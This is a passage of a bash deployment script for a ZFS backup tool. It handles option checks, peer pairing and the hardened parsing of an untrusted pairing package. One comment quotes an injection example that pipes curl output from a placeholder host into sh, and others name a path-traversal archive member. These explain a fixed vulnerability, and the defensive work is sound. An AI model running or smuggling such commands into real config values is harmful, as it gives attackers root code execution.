                          --fullcron placeholder exactly as saved, and
                          un-comments any paused managed block. Refuses a
                          --fullcron placeholder that looks hand-edited
                          (resolve it by hand instead of silently discarding
                          it); a paused block instead keeps any line added
                          during the window that doesn't look like its own.

Updating this checkout, and undoing an update:
  --self-update           fast-forward the checkout to origin and record the
                          revision it came FROM, so --rollback has somewhere to
                          go. Refuses while updates are HELD, and refuses if
                          the update-control state looks tampered with (a
                          symlink where a plain file belongs). This is what the
                          hourly timer runs.
  --rollback              return the checkout to the revision --self-update
                          recorded, and HOLD updates so the next timer run does
                          not immediately undo it. Fails loudly when nothing
                          was recorded rather than guessing a target.
  --resume-updates        release that hold, so --self-update runs again.

                          These three also live in update-control.sh, deployed
                          OUTSIDE the checkout for the obvious reason: a
                          rollback of the repository must not roll back the
                          thing performing it. The copies here are the
                          bootstrap path for a host that has never deployed the
                          wrapper yet.

Enrolment helpers:
  --join-check=PACKAGE    read a pairing package and print what --join WOULD do
                          with it -- checksum, keys, datasets, paths -- and
                          change nothing. Use it before --join on a host whose
                          state you are unsure of.
  --add-quiesce           provision the quiesce grant for an account that
                          already exists, MERGING into the current whitelist
                          instead of replacing it. --join deliberately
                          overwrites, because re-running it with a narrower
                          dataset list is supposed to drop what was removed;
                          this is the remediation variant, for when the caller
                          knows only the datasets one config needs and the file
                          may also carry grants from another config or an older
                          deployment. Idempotent.
USAGE
            exit 0 ;;
        *) echo "unknown option: $1 (try --help)" >&2; exit 2 ;;
    esac
done
case "$ALERT_MODE" in
    daily|immediate) ;;
    *) echo "--alerts must be 'daily' or 'immediate', got '$ALERT_MODE'" >&2; exit 2 ;;
esac
case "$PEER_ROLE" in
    pull|push) ;;
    *) echo "--role must be 'pull' or 'push', got '$PEER_ROLE'" >&2; exit 2 ;;
esac
# REV-20260802-033 slice 5 (F1): --mode is the alternative to
# --peer-datasets for a pull relationship -- named datasets is the expert
# path (the operator already knows the source's ZFS layout), --mode is the
# high-level one (discovery happens later, on the peer, via --draft-scope/
# --commit-scope -- slice 4). The two describe mutually exclusive ways of
# reaching the same field in the package, so combining them is refused
# rather than silently preferring one.
if [ -n "$PEER_MODE" ]; then
    case "$PEER_MODE" in
        backup|sync) ;;
        *) echo "--mode must be 'backup' or 'sync', got '$PEER_MODE'" >&2; exit 2 ;;
    esac
    [ "$PEER_ROLE" = "pull" ] \
        || { echo "--mode only applies to --role=pull -- a push peer's operator already names its own datasets with --peer-datasets" >&2; exit 2; }
    [ -z "$PEER_DATASETS" ] \
        || { echo "--mode and --peer-datasets are mutually exclusive -- --mode defers dataset selection to the peer (--draft-scope/--commit-scope); --peer-datasets names it here directly. Pick one" >&2; exit 2; }
    if [ "$PEER_MODE" = "sync" ] && [ -n "$PEER_TARGET" ]; then
        echo "--mode=sync cannot be combined with --target -- sync reproduces source paths at the SAME paths on this host, so there is no separate target root to name (F3)" >&2; exit 2
    fi
fi
case "$PEER_AS" in
    root|delegated) ;;
    *) echo "--as must be 'root' or 'delegated', got '$PEER_AS'" >&2; exit 2 ;;
esac
# Refused rather than ignored: silently accepting it would leave the operator
# believing quiesce was granted when nothing was installed at all.
#
# TWO paths grant this, and they are different relationships:
#
#   --join       the JOINING PEER may freeze guests on this host (remote
#                quiesce, snapget -q from the other end)
#   Phase 8      THIS host's own delegated account may freeze guests on this
#                host (local quiesce -- snapsend -q in a managed block that
#                the account owns rather than root)
#
# The second did not exist, and its absence was found the only way these things
# ever are: `migrate-to-account` on metropolis pve1 (2026-08-01) refused to move
# a block carrying `quiesce = auto` because the account had no grant, and there
# was no command that could give it one. deploy.sh owns the privileged surface,
# so the route belongs here rather than in the migration verb.
#
# Phase 8's applicability cannot be decided at argument time: an existing
# account is DETECTED at run time, not named. So the only refusals here are the
# combinations that can never install anything, and Phase 8 warns if there
# turned out to be nobody to grant to.
if [ "$ALLOW_QUIESCE" -eq 1 ] && [ "$CHECK_ONLY" -eq 1 ]; then
    echo "--allow-quiesce cannot be combined with --check-only -- an audit installs nothing, so there would be no grant to make" >&2; exit 2
fi
if [ "$ALLOW_QUIESCE" -eq 1 ] && [ "$PAIR_MODE" -eq 1 ]; then
    echo "--allow-quiesce is not a --pair option -- the host that decides whether guests here may be frozen is the one running --join (for a peer) or a plain deploy.sh (for its own delegated account)" >&2; exit 2
fi
# REV-20260801-022 F1. The first version of the local path leaned on Phase 8's
# account DETECTION and only warned when it found nothing -- a privilege
# provisioning command that exits 0 having provisioned nothing. A human might
# read the warning; a wrapper reads the exit code and goes on to migrate a block
# whose account still cannot freeze anything.
#
# Making the grant name its recipient fixes that at argument time instead of at
# runtime, and it is the better rule anyway: detection is the right default for
# MAINTENANCE (keep whatever account this host already has up to date) and the
# wrong one for a privilege grant, where "whichever account happened to be found"
# is not a decision anyone made. BACKUP_USER is read, not the flag, so a host
# that pins the account in the config block at the top still works.
if [ "$ALLOW_QUIESCE" -eq 1 ] && [ "$JOIN_MODE" -ne 1 ] && [ "$COMMIT_SCOPE_MODE" -ne 1 ] && [ -z "$BACKUP_USER" ]; then
    echo "--allow-quiesce must name the account that receives the grant: --backup-user=NAME (with --datasets=\"...\" naming exactly the datasets whose guests it may freeze). An existing account is fine -- it is left alone. Nothing was installed." >&2; exit 2
fi
if [ "$PAIR_MODE" -eq 1 ] && [ "$JOIN_MODE" -eq 1 ]; then
    echo "--pair and --join are mutually exclusive" >&2; exit 2
fi
# REV-20260802-033 slice 2: --commit-scope grants from the scope file the
# operator edited after --join (see do_join, do_commit_scope). It is its own
# standalone act, same shape as --revoke-quiesce -- not a --pair/--join
# sub-option.
if [ "$COMMIT_SCOPE_MODE" -eq 1 ] || [ "$COMMIT_SCOPE_CHECK" -eq 1 ]; then
    if [ "$COMMIT_SCOPE_MODE" -eq 1 ] && [ "$COMMIT_SCOPE_CHECK" -eq 1 ]; then
        echo "--commit-scope and --commit-scope-check are mutually exclusive -- pick one" >&2; exit 2
    fi
    if [ "$PAIR_MODE" -eq 1 ] || [ "$JOIN_MODE" -eq 1 ]; then
        echo "--commit-scope/--commit-scope-check cannot be combined with --pair/--join -- run --join first, edit the scope file, then commit it separately" >&2; exit 2
    fi
    [ -n "$COMMIT_SCOPE_LABEL" ] || { echo "--commit-scope/--commit-scope-check needs a label (the peer's initiator label, same one --join printed)" >&2; exit 2; }
fi
if [ "$COMMIT_SCOPE_MODE" -eq 1 ] && [ "$CHECK_ONLY" -eq 1 ]; then
    echo "--check-only cannot be combined with --commit-scope -- an audit installs nothing, so there would be no grant to make (use --commit-scope-check to validate without granting)" >&2; exit 2
fi
# Slice 4: --draft-scope discovers and writes; --commit-scope/-check read and
# grant/validate. Two different acts against the same file at two different
# times -- combining them in one invocation would either grant from a file
# that does not exist yet or overwrite one an operator is mid-edit on.
if [ "$DRAFT_SCOPE_MODE" -eq 1 ] || [ "$DRAFT_SCOPE_CHECK" -eq 1 ]; then
    if [ "$DRAFT_SCOPE_MODE" -eq 1 ] && [ "$DRAFT_SCOPE_CHECK" -eq 1 ]; then
        echo "--draft-scope and --draft-scope-check are mutually exclusive -- pick one" >&2; exit 2
    fi
    if [ "$COMMIT_SCOPE_MODE" -eq 1 ] || [ "$COMMIT_SCOPE_CHECK" -eq 1 ]; then
        echo "--draft-scope/--draft-scope-check cannot be combined with --commit-scope/--commit-scope-check -- draft first, edit, then commit separately" >&2; exit 2
    fi
    if [ "$PAIR_MODE" -eq 1 ] || [ "$JOIN_MODE" -eq 1 ]; then
        echo "--draft-scope/--draft-scope-check cannot be combined with --pair/--join -- run --join first, then draft the scope file separately" >&2; exit 2
    fi
    [ -n "$DRAFT_SCOPE_LABEL" ] || { echo "--draft-scope/--draft-scope-check needs a label (the peer's initiator label, same one --join printed)" >&2; exit 2; }
fi
if [ "$DRAFT_SCOPE_MODE" -eq 1 ] && [ "$CHECK_ONLY" -eq 1 ]; then
    echo "--check-only cannot be combined with --draft-scope -- an audit writes nothing, so there would be no file to draft (use --draft-scope-check to validate without writing)" >&2; exit 2
fi
if [ "$PAUSE_MODE" -eq 1 ] && [ "$RESUME_MODE" -eq 1 ]; then
    echo "--pause and --resume are mutually exclusive -- pick one" >&2; exit 2
fi
if [ "$PAUSE_MODE" -eq 1 ] || [ "$RESUME_MODE" -eq 1 ]; then
    if [ "$PAIR_MODE" -eq 1 ] || [ "$JOIN_MODE" -eq 1 ] || [ "$COMMIT_SCOPE_MODE" -eq 1 ] || [ "$COMMIT_SCOPE_CHECK" -eq 1 ] || [ "$DRAFT_SCOPE_MODE" -eq 1 ] || [ "$DRAFT_SCOPE_CHECK" -eq 1 ]; then
        echo "--pause/--resume cannot be combined with --pair/--join/--commit-scope/--draft-scope -- run them separately" >&2; exit 2
    fi
    if [ "$CHECK_ONLY" -eq 1 ]; then
        echo "--check-only cannot be combined with --pause/--resume -- an audit changes nothing, so there would be nothing to pause or resume" >&2; exit 2
    fi
fi
if [ "$FULLCRON_MODE" -eq 1 ] && [ "$PAUSE_MODE" -ne 1 ]; then
    echo "--fullcron only modifies --pause -- --resume auto-detects which of the two modes it finds and undoes that one, so --fullcron has nothing to select there" >&2; exit 2
fi
if [ "$PEER_UNPAIR" -eq 1 ]; then
    [ -n "$PEER_HOST" ] || { echo "--unpair requires --peer=NAME" >&2; exit 2; }
    # Every other sub-mode maintains a relationship; this one ends it. Combining
    # them is always a mistake, and the one that would hurt is --unpair --rotate
    # (generate a key, then delete it).
    if [ "$PEER_ROTATE" -eq 1 ] || [ "$PEER_REVOKE_OLD" -eq 1 ] || [ "$PEER_DRAFT_CONFIG" -eq 1 ]; then
        echo "--unpair cannot be combined with --rotate/--revoke-old/--draft-config" >&2; exit 2
    fi
fi
# --local-user names an account on THIS host, so it can be checked before any
# state is touched. Refusing here (rather than silently skipping the key copy
# and the delegation) keeps a typo from producing a pairing that looks complete
# and fails at 2am with "permission denied".
if [ -n "$PEER_LOCAL_USER" ]; then
    if [ "$PAIR_MODE" -eq 0 ] || [ "$PEER_UNPAIR" -eq 1 ]; then
        echo "--local-user only applies to --pair (on --unpair the account comes from the manifest)" >&2; exit 2
    fi
    if ! id "$PEER_LOCAL_USER" >/dev/null 2>&1; then
        echo "--local-user='$PEER_LOCAL_USER' does not exist on this host -- create it first: bash deploy.sh --backup-user=$PEER_LOCAL_USER" >&2
        exit 2
    fi
fi
if { [ "$PAIR_MODE" -eq 1 ] || [ "$JOIN_MODE" -eq 1 ]; } && [ "$CHECK_ONLY" -eq 1 ]; then
    echo "--check-only cannot be combined with --pair/--join -- these mutate state by design (new keys, new accounts, new grants)" >&2
    exit 2
fi
if [ "$PAIR_MODE" -eq 1 ] && [ -z "$PEER_HOST" ]; then
    echo "--pair requires --peer=HOST" >&2; exit 2
fi
if [ $(( PEER_ROTATE + PEER_REVOKE_OLD + PEER_DRAFT_CONFIG )) -gt 1 ]; then
    echo "--rotate, --revoke-old and --draft-config are mutually exclusive -- pick one" >&2
    exit 2
fi

# Used by --join/--join-check to identify a key; lives up here because the
# package handling below runs before the rest of this script is even defined.
pubkey_fingerprint() {
    ssh-keygen -lf "$1" 2>/dev/null | awk '{print $2}'
}

# ============================================================================
# The wsad package is UNTRUSTED STRUCTURED DATA, not code.
#
# --join runs as root on a host that has no relationship with the sender yet --
# that is the entire point of the feature. It used to consume the package with
# `. "$workdir/peer.conf"`, and `source` is not a way of reading configuration:
# it is a way of executing a file. A package containing
#     PEER_CONF_ROLE=pull; curl http://x/y | sh
# ran that as root. No parser bug required; command execution is the documented
# behaviour of the operation that was used. Reported as F1 (P0) in
# docs/internal/reviews/REV-20260729-001.md and confirmed in the source before fixing.
#
# The archive was also extracted before anyone checked what was in it, so path
# traversal, absolute paths, symlinks and extra payload members all had a free
# ride.
#
# There is a second-order sink worth naming: --join writes the values it read
# into a manifest that later runs get through `.` again. A value carrying a
# newline would therefore inject whole lines into a file that IS sourced, later,
# by a different invocation. The grammar checks below are what closes that too,
# which is why they reject control characters rather than merely quoting well.
# ============================================================================

# Exactly two members, exact names, nothing else. This one check covers most of
# the archive attacks by itself: '../../etc/cron.d/payload', an absolute path,
# a duplicate peer.conf and any extra member are all "not exactly these two
# names, once each".
#
# A member name containing a newline could split into two lines that LOOK like
# the expected pair; that is caught after extraction instead, where the file
# with the real (newline-bearing) name is not a regular file at either path.
# Conservative bounds. A legitimate wsad is one or two kilobytes; nothing here
# is a judgement call about what is "big enough", it is a refusal to let an
# untrusted file decide how much disk root spends before anything has agreed the
# file is even the right shape.
PKG_MAX_COMPRESSED=65536
PKG_MAX_MEMBER=8192

assert_package_members() {
    local pkg="$1"

    local size; size=$(wc -c < "$pkg" 2>/dev/null) || die "could not size $pkg"
    [ "$size" -le "$PKG_MAX_COMPRESSED" ] \
        || die "$pkg is ${size} bytes, over the ${PKG_MAX_COMPRESSED}-byte limit for a wsad -- a real one is a couple of kilobytes. Refusing to decompress it."

    local names
    names=$(tar -tzf "$pkg" 2>/dev/null) || die "could not read $pkg -- not a valid wsad (expected a gzipped tar)"
    local expected; expected=$(printf 'peer.conf\npubkey.pub\n')
    local got; got=$(printf '%s\n' "$names" | grep -v '^$' | sort)
    [ "$got" = "$expected" ] || die "$pkg does not contain exactly the two expected members. Found: $(printf '%s' "$names" | tr '\n' ' ')-- a wsad is peer.conf + pubkey.pub and nothing else. Refusing to unpack it."

    # Entry TYPES, before extraction rather than after. Checking `-f` on the
    # unpacked result was the earlier approach and it is too late by
    # construction: a FIFO or device node has already been created by root at
    # that point, and a hard link arrives as an ordinary regular file that no
    # test on the result can tell apart. The verbose listing's first character
    # is the type -- '-' regular, 'l' symlink, 'h' hard link, 'd' directory,
    # 'p' FIFO, 'b'/'c' device.
    local listing; listing=$(tar -tzvf "$pkg" 2>/dev/null) \
        || die "could not list $pkg -- not a valid wsad"
    local line type sz
    while IFS= read -r line; do
        [ -n "$line" ] || continue
        type="${line:0:1}"
        case "$type" in
            -) ;;
            l) die "a wsad member is a symlink -- only regular files are accepted" ;;
            h) die "a wsad member is a hard link -- only regular files are accepted" ;;
            d) die "a wsad member is a directory -- only regular files are accepted" ;;
            p) die "a wsad member is a FIFO -- only regular files are accepted" ;;
            b|c) die "a wsad member is a device node -- only regular files are accepted" ;;
            *) die "a wsad member has an unexpected archive entry type '$type' -- only regular files are accepted" ;;
        esac
        # Declared size, so a decompression bomb is refused before it is
        # expanded rather than after.
        sz=$(printf '%s\n' "$line" | awk '{print $3}')
        case "$sz" in
            ''|*[!0-9]*) die "cannot read a member's declared size from the archive listing -- refusing to extract something this script cannot describe" ;;
        esac
        [ "$sz" -le "$PKG_MAX_MEMBER" ] \
            || die "a wsad member declares ${sz} bytes, over the ${PKG_MAX_MEMBER}-byte limit -- peer.conf and pubkey.pub are a few hundred bytes each"
    done <<< "$listing"
}

# Validate and extract ONE private copy, never the caller's path.
#
# The package used to be opened twice -- once by the preflight, once by the
# extraction -- so if it sat in a directory another account can write, the bytes
# that were checked need not be the bytes that got extracted as root. It also
# meant --join-check could never be evidence about a later --join, since each
# reopened the path independently. Copying first collapses both problems: from
# the copy onward there is exactly one artifact, and its SHA-256 is printed so
# the two commands can be compared by hand.
prepare_package() {
    local pkg="$1"
    [ -r "$pkg" ] || die "cannot read wsad package: $pkg"
    JOIN_WORKDIR=$(mktemp -d) || die "mktemp -d failed"
    chmod 700 "$JOIN_WORKDIR"
    # GLOBAL, not local: the trap below runs at shell exit, by which time a
    # function-local variable is out of scope -- under `set -u` the trap then
    # dies on an unbound variable and removes nothing at all.
    trap deploy_exit_cleanup EXIT

    local copy="$JOIN_WORKDIR/wsad.tgz"
    # install, not cp: mode and ownership are set as the file is created, so
    # there is no window where it exists with the source's permissions.
    install -m 600 "$pkg" "$copy" || die "could not take a private copy of $pkg"

    PKG_SHA256=$(sha256sum "$copy" 2>/dev/null | cut -d' ' -f1)
    assert_package_members "$copy"
    tar --no-same-owner --no-same-permissions -C "$JOIN_WORKDIR" -xzf "$copy" \
        || die "could not unpack $pkg -- not a valid wsad?"
    local f
    for f in peer.conf pubkey.pub; do
        [ -L "$JOIN_WORKDIR/$f" ] && die "$f in the package is a symlink -- a wsad holds two regular files"
        [ -f "$JOIN_WORKDIR/$f" ] || die "$f did not unpack as a regular file -- refusing to read it"
    done
    parse_peer_conf "$JOIN_WORKDIR/peer.conf"
    validate_peer_conf
    validate_pubkey_file "$JOIN_WORKDIR/pubkey.pub"
}

# --- peer.conf: parsed by allow-list, never executed ------------------------
declare -A PC=()

# Grammar helpers, deliberately narrow. Every one of these values ends up as a
# useradd argument, a ZFS dataset name, a path component or a manifest line, and
# each of those has its own way of turning a surprising character into a
# surprise.
# A character allow-list is not a grammar. These values are handed to `zfs
# list`, `zfs create` and `zfs allow`, where a leading '-' is an OPTION no
# amount of quoting turns back into a name -- the same trap delsnaps.sh already
# hit once and fixed with `--`, which had not propagated here. Dot segments are
# refused for the same reason a path library refuses them: '.' and '..' are
# navigation, not names, and this contract has no use for either.
# pc_is_dataset / pc_is_account / pc_is_label / pc_is_port moved to lib-scope.sh
# (sourced at the top of this file): the scope file needs exactly these rules,
# and a second correct implementation is still a second thing to keep correct.


parse_peer_conf() {
    local file="$1" line key val n=0
    while IFS= read -r line || [ -n "$line" ]; do
        n=$((n + 1))
        # A package written on a CRLF box is a format problem to report, not a
        # stray \r to carry into a username.
        line="${line%$'\r'}"
        case "$line" in ''|'#'*) continue ;; esac
        case "$line" in *=*) ;; *) die "peer.conf line $n is not a KEY=VALUE assignment: '$line'" ;; esac
        key="${line%%=*}"
        val="${line#*=}"
        case "$key" in
            PEER_CONF_ROLE|PEER_CONF_DATASETS|PEER_CONF_TARGET|PEER_CONF_AS|\
            PEER_CONF_MODE|PEER_CONF_ACCOUNT|PEER_CONF_PORT|PEER_CONF_INITIATOR_LABEL|\
            PEER_CONF_REMOTE_JOIN|PEER_CONF_REQUESTED) ;;
            *) die "peer.conf line $n has unknown key '$key' -- a wsad has a fixed set of keys and anything else means the package was not produced by --pair" ;;
        esac
        [ -z "${PC[$key]+x}" ] || die "peer.conf has '$key' twice (line $n) -- refusing to guess which one was meant"
        # One optional layer of double quotes, as --pair writes for DATASETS.
        case "$val" in
            \"*\") val="${val#\"}"; val="${val%\"}" ;;
        esac
        # Nothing that only matters when a string is EXECUTED has any business
        # in a file that is only ever read.
        case "$val" in
            *[\"\'\\\$\`]*) die "peer.conf value for '$key' contains a quote, backslash, \$ or backtick -- these have no meaning in a value that is never executed, and every reason to be there is a bad one" ;;
            *[!\ [:print:]]*) die "peer.conf value for '$key' contains a control character" ;;
        esac
        PC["$key"]="$val"
    done < "$file"
}

validate_peer_conf() {
    local k ds mode
    for k in PEER_CONF_ROLE PEER_CONF_ACCOUNT PEER_CONF_AS \
             PEER_CONF_INITIATOR_LABEL; do
        [ -n "${PC[$k]:-}" ] || die "peer.conf is missing $k (or it is empty) -- not a valid wsad"
    done
    case "${PC[PEER_CONF_ROLE]}" in
        pull|push) ;;
        *) die "peer.conf PEER_CONF_ROLE='${PC[PEER_CONF_ROLE]}' -- must be 'pull' or 'push'" ;;
    esac
    case "${PC[PEER_CONF_AS]}" in
        root|delegated) ;;
        *) die "peer.conf PEER_CONF_AS='${PC[PEER_CONF_AS]}' -- must be 'root' or 'delegated'" ;;
    esac

    # REV-20260802-033 slice 5 (F1): PEER_CONF_MODE is the alternative to a
    # named dataset list for a pull relationship -- validated before the
    # target/dataset rules below, since it decides what those rules require.
    # A package that predates this slice has no such key at all
    # (parse_peer_conf leaves PC[PEER_CONF_MODE] unset), so mode="" and every
    # rule below falls through to the exact behaviour this replaces.
    mode="${PC[PEER_CONF_MODE]:-}"
    if [ -n "$mode" ]; then
        case "$mode" in
            backup|sync) ;;
            *) die "peer.conf PEER_CONF_MODE='$mode' -- must be 'backup' or 'sync'" ;;
        esac
        [ "${PC[PEER_CONF_ROLE]}" = "pull" ] \
            || die "peer.conf PEER_CONF_MODE='$mode' with PEER_CONF_ROLE='${PC[PEER_CONF_ROLE]}' -- mode only applies to a pull relationship"
        [ -z "${PC[PEER_CONF_DATASETS]:-}" ] \
            || die "peer.conf carries both PEER_CONF_MODE and PEER_CONF_DATASETS -- these are alternative ways of choosing what to back up, and a package must use exactly one, never both"
        if [ "$mode" = "sync" ] && [ -n "${PC[PEER_CONF_TARGET]:-}" ]; then
            die "peer.conf PEER_CONF_MODE='sync' but PEER_CONF_TARGET='${PC[PEER_CONF_TARGET]}' is set -- sync reproduces source paths at the same paths on the collector, so a package must not carry a target for it"
        fi
    fi

    # LAB6 pass 7 F-1. PEER_CONF_REQUESTED is what the collector NAMED, and it
    # is only meaningful where the dataset LIST was deferred: with
    # PEER_CONF_DATASETS the request IS the list, and without a mode there is
    # no deferral to narrow. Refusing both combinations keeps exactly one
    # reading of "what was asked for" in any valid package -- the property that
    # makes the mode/datasets pair safe in the first place.
    if [ -n "${PC[PEER_CONF_REQUESTED]:-}" ]; then
        [ -n "$mode" ] \
            || die "peer.conf carries PEER_CONF_REQUESTED without PEER_CONF_MODE -- a request only narrows a scope whose dataset list was deferred to this host; without a mode the list is PEER_CONF_DATASETS and there is nothing to narrow"
        [ -z "${PC[PEER_CONF_DATASETS]:-}" ] \
            || die "peer.conf carries both PEER_CONF_REQUESTED and PEER_CONF_DATASETS -- the datasets ARE the request in that form, so a package must never carry both"
        for ds in ${PC[PEER_CONF_REQUESTED]}; do
            pc_is_dataset "$ds" \
                || die "peer.conf PEER_CONF_REQUESTED contains '$ds', which is not a valid ZFS dataset name"
        done
    fi

    # Target is required unless mode already decided its shape: sync forbids
    # it above, backup leaves it to the collector's own default (resolved
    # before --pair ever runs, per F1) -- this is the one field whose
    # requirement genuinely depends on mode, everything else below is
    # unchanged from before this slice.
    if [ -z "$mode" ]; then
        [ -n "${PC[PEER_CONF_TARGET]:-}" ] || die "peer.conf is missing PEER_CONF_TARGET (or it is empty) -- not a valid wsad"
    fi
    if [ -n "${PC[PEER_CONF_TARGET]:-}" ]; then
        pc_is_dataset "${PC[PEER_CONF_TARGET]}" \
            || die "peer.conf PEER_CONF_TARGET='${PC[PEER_CONF_TARGET]}' is not a valid ZFS dataset name"
    fi
    pc_is_account "${PC[PEER_CONF_ACCOUNT]}" \
        || die "peer.conf PEER_CONF_ACCOUNT='${PC[PEER_CONF_ACCOUNT]}' is not a valid account name (this string is passed to useradd)"
    pc_is_label "${PC[PEER_CONF_INITIATOR_LABEL]}" \
        || die "peer.conf PEER_CONF_INITIATOR_LABEL='${PC[PEER_CONF_INITIATOR_LABEL]}' is not a valid label (it becomes a path component)"
    # REV-20260802-033 slice 9 / U10: present only when --pair --join-remotely
    # wrote this package -- a fixed literal, not a free-form claim, since all
    # it needs to say is "yes". A package that predates this slice has no such
    # key (parse_peer_conf leaves it unset), so absent reads the same as "no".
    if [ -n "${PC[PEER_CONF_REMOTE_JOIN]:-}" ] && [ "${PC[PEER_CONF_REMOTE_JOIN]}" != "yes" ]; then
        die "peer.conf PEER_CONF_REMOTE_JOIN='${PC[PEER_CONF_REMOTE_JOIN]}' -- must be 'yes' or absent"
    fi
    if [ -n "${PC[PEER_CONF_PORT]:-}" ]; then
        pc_is_port "${PC[PEER_CONF_PORT]}" \
            || die "peer.conf PEER_CONF_PORT='${PC[PEER_CONF_PORT]}' is not a port number in 1..65535"
    fi
    for ds in ${PC[PEER_CONF_DATASETS]:-}; do
        pc_is_dataset "$ds" || die "peer.conf PEER_CONF_DATASETS contains '$ds', which is not a valid ZFS dataset name"
    done
    if [ "${PC[PEER_CONF_ROLE]}" = "pull" ] && [ -z "${PC[PEER_CONF_DATASETS]:-}" ] && [ -z "$mode" ]; then
        die "peer.conf declares role=pull but lists no datasets and no mode -- there would be nothing to delegate (either --peer-datasets=\"...\" or --mode=backup|sync is required)"
    fi
}

# Exactly ONE public key, and one that cannot smuggle authorized_keys options.
# `command="..." ssh-ed25519 AAAA...` is a perfectly well-formed authorized_keys
# line; requiring the record to START with a key type is what refuses it.
validate_pubkey_file() {
    local f="$1" lines first
    lines=$(grep -c '[^[:space:]]' "$f" 2>/dev/null || echo 0)
    [ "$lines" -eq 1 ] || die "pubkey.pub must hold exactly one public key, found $lines non-blank lines"
    first=$(grep -m1 '[^[:space:]]' "$f")
    case "$first" in
        ssh-ed25519\ *|ssh-rsa\ *|ecdsa-sha2-nistp256\ *|ecdsa-sha2-nistp384\ *|\
        ecdsa-sha2-nistp521\ *|sk-ssh-ed25519@openssh.com\ *|sk-ecdsa-sha2-nistp256@openssh.com\ *) ;;
        *) die "pubkey.pub does not start with a public key type -- an authorized_keys options prefix (command=\"...\", environment=\"...\") is not accepted here" ;;
    esac
    case "$first" in
        *[!\ [:print:]]*) die "pubkey.pub contains a control character" ;;
    esac
    ssh-keygen -lf "$f" >/dev/null 2>&1 \
        || die "pubkey.pub is not a public key OpenSSH can read"
}

# PEER_STATE_DIR/PEER_KEY_DIR and their path helpers. Hoisted here (rather than
# down with the rest of --pair/--join, PAIRING-DESIGN.md's section) because
# do_commit_scope_check needs peer_manifest_path/peer_scope_path and its
# --commit-scope-check dispatch runs before the root check, same reasoning as
# do_join_check just below.
#
# Overridable so a root-free suite can point commit-scope's preflight (manifest
# lookup, scope file read) at a throwaway directory instead of the real,
# root-owned one -- same technique as ZFS_QUIESCE_ALLOW_DIR elsewhere in this
# file. The default is unchanged for every real invocation.
PEER_STATE_DIR="${PEER_STATE_DIR:-/etc/zfs-snapshot-all/peers}"
PEER_KEY_DIR="/root/.ssh/pairing"

# A filesystem/account-name-safe label derived from --peer. A hostname can
# contain characters that are fine in DNS but not in a Unix username or a bare
# filename, so this is the ONE place that gets sanitised -- the manifest path,
# the key file name and the proposed account name are all built from it.
peer_label() {
    printf '%s' "$PEER_HOST" | tr -c 'A-Za-z0-9._-' '-'
}

peer_manifest_path() {
    echo "$PEER_STATE_DIR/$1.conf"
}

# REV-20260802-033 (U1/U2): the scope file lives beside the manifest, keyed by
# the same label, on the SAME host as the manifest -- this host is the source
# in a pull relationship, so it is the one that both edits the file and grants
# from it. Not part of the wsad package: it is authored here, by hand, after
# --join, never shipped.
peer_scope_path() {
    echo "$PEER_STATE_DIR/$1.scope"
}

# remote_scope_stage <label> <host> <port> <scope-path> -- REV-20260804-037
# F1: the draft/edit/check substage of --join-remotely's scope editor,
# extracted to its own function so it is independently testable (sed-range,
# same technique test/draftscope already uses for do_draft_scope) with a
# stubbed ssh -- this is ordinary shell control flow over an already-pinned
# link, not the zfs allow/unallow trust semantics this project deliberately
# leaves to live verification only.
#
# Runs over ssh -t on the peer: drafts the scope ONLY if it does not exist
# yet, opens $VISUAL/$EDITOR/vi on it, and on a clean editor exit runs the
# NON-GRANTING --commit-scope-check as proof the file the editor produced
# actually parses -- before this function's caller may call the scope
# "edited and ready". Exit codes:
#   0  scope exists (or was freshly drafted), edited, and passes the check
#   2  --draft-scope failed -- stopped before the editor, no file created
#   3  the editor itself exited non-zero
#   4  --commit-scope-check failed on the file the editor produced
#   5  no terminal here, so the scope was drafted but NOT reviewed (P6)
#   *  ssh/transport failure (host unreachable, session killed, etc.)
#
# P6, measured in the 2026-08-20 campaign: with no terminal on this side, the
# `ssh -t` below still allocated a pty on the peer and vi opened into nobody.
# Eight minutes, a swap file left behind, the whole enrolment stalled -- and
# what ended it was a timeout imposed from outside, not this code.
#
# The gate is local, and it has to be: `-t` forces a pty on the peer whether or
# not a human exists here, so asking the peer is asking the wrong end. Same
# `[ -t 0 ]` shape as the O14 fix on --join, for the same reason -- an editor is
# a conversation, and there is nobody to have it with.
#
# The terminal test is its own function for one reason: test/joinremote drives
# remote_scope_stage directly, and CI never has a tty, so with `[ -t 0 ]` inline
# the three editor paths (runs / fails / post-check fails) became unreachable --
# the gate would have silently deleted its own test coverage. A one-line
# function is overridable; an inline condition is not.
have_terminal() { [ -t 0 ]; }

remote_scope_stage() {
    local label="$1" host="$2" port="$3" scope="$4"
    local can_edit=0; have_terminal && can_edit=1
    local remote_script
    remote_script=$(cat <<EOF2
set -u
cd $REPO_DIR || { echo "cannot cd into $REPO_DIR on this peer -- is deploy.sh deployed at its usual path?" >&2; exit 1; }
SCOPE="$scope"
CAN_EDIT=$can_edit
if [ -e "\$SCOPE" ]; then
    echo "existing scope file found at \$SCOPE -- opening it directly, no draft"
else
    if ! ./deploy.sh --draft-scope=$label; then
        echo "draft-scope failed for label '$label' (see error above) -- stopping before the editor; no scope file was created" >&2
        exit 2
    fi
fi
if [ "\$CAN_EDIT" -ne 1 ]; then
    echo "the scope is drafted at \$SCOPE, but this run has no terminal, so it has NOT been reviewed." >&2
    echo "A scope is a consent document; opening an editor with nobody at it does not produce consent." >&2
    echo "On this peer ($host), read it, narrow it to what you actually want to hand over, then commit it:" >&2
    echo "    \${EDITOR:-vi} \$SCOPE" >&2
    echo "    cd $REPO_DIR && ./deploy.sh --commit-scope=$label" >&2
    echo "Nothing was granted." >&2
    exit 5
fi
\${VISUAL:-\${EDITOR:-vi}} "\$SCOPE"
ec=\$?
if [ "\$ec" -ne 0 ]; then
    echo "editor exited \$ec -- not treating the scope as edited" >&2
    exit 3
fi
if ! ./deploy.sh --commit-scope-check=$label; then
    echo "scope at \$SCOPE failed --commit-scope-check after editing (see error above) -- fix it by hand before committing" >&2
    exit 4
fi
echo "scope for '$label' is valid and ready for local --commit-scope=$label"
exit 0
EOF2
)
    # -t only when there IS a terminal to attach it to. Asking for a pty from a
    # session that has none is how the peer ended up running vi for nobody.
    if [ "$can_edit" -eq 1 ]; then
        ssh -t -o UserKnownHostsFile=/root/.ssh/known_hosts -o StrictHostKeyChecking=yes \
            -p "$port" "root@$host" "$remote_script"
    else
        ssh -n -o UserKnownHostsFile=/root/.ssh/known_hosts -o StrictHostKeyChecking=yes \
            -p "$port" "root@$host" "$remote_script"
    fi
}

